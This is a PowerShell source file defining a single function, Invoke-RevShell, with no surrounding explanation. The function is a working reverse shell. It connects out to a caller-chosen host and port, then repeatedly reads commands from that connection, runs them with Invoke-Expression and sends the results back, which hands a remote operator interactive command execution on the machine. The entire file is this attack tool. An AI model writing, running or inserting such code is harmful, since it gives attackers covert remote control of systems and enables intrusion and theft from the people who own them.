function Invoke-RevShell {
    param(
        [string]$LHOST,
        [int]$LPORT
    )

    # Establish TCP connection
    $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT)
    $NetworkStream = $TCPClient.GetStream()
    $StreamWriter = New-Object IO.StreamWriter($NetworkStream)
    $StreamWriter.AutoFlush = $true
    $StreamReader = New-Object IO.StreamReader($NetworkStream)

    try {
        while ($TCPClient.Connected) {
            $StreamWriter.Write("PS " + (Get-Location).Path + "> ")  # Send the prompt
            $Command = $StreamReader.ReadLine()
            if ($Command -eq "exit") { break }  # Exit cleanly if 'exit' is received
            try {
                $Output = Invoke-Expression $Command 2>&1 | Out-String
            } catch {
                $Output = $_.ToString()
            }
            $StreamWriter.WriteLine($Output)
        }
    } finally {
        $StreamWriter.Close()
        $StreamReader.Close()
        $NetworkStream.Close()
        $TCPClient.Close()
    }
}